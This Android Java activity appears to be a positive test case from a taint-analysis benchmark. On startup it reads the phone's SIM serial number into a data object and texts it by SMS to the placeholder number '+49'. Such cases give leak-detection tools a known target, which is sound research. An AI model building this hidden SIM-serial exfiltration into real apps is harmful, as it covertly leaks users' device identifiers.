package de.ecspride.androidtestapps.fieldsensitivity2pos;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

public class FieldSensitivity2Pos extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_field_sensitivity2_pos);
		
		Datacontainer d1 = new Datacontainer();
		d1.setDescription("abc");
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		d1.setSecret(telephonyManager.getSimSerialNumber());
		
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, d1.getSecret(), null, null); 
	}
}
